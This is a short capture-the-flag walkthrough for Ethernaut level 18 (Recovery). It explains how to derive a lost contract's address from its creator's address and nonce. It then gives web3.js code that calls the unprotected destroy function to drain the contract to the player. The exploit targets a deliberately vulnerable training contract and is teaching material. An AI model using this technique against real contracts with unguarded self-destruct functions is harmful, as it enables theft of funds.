# Ethernaut Level 18 (Recovery) Walkthrough

The following is a semantic solution walkthrough of the Ethernaut CTF level 18. The aim is to give a readable explanation of the concepts involved, and present a step-by-step walkthrough of the solution. In addition, tangential explanations will also be given where essential.

The lesson here is that the address of a contract is a function of the creator's address and its nonce. Specifically, it is the rightmost (least significant or little endian) 160 bits (20 bytes) of the Keccak256 hash of the RLP encoding of the creator address and nonce. One must always keep track of the nonce at the time this contract instance was made.
`bytes20(keccak256(RLPencode(creator_addr, nonce))`
On Web3 JS this can be done by:
`web3.utils.soliditySha3('0xd6','0x94',contract.address,'0x03');`
Or you can just visit etherscan and get the instance address from there as well.

#### Solution

Having fetched the contract address, just call the destroy function with any address to destroy drain the contract instance.

```
callStr = web3.eth.abi.encodeFunctionCall({
    name: 'destroy',
    type: 'function',
    inputs: [{
        type: 'address',
        name: '_to'
    }]
}, [player]);
```

Then, make the call
`web3.eth.sendTransaction({from: player, to: '0xD4048B53bf22e917B7b0dCf09cDf7dfC54a3F7c2', data: callStr})`
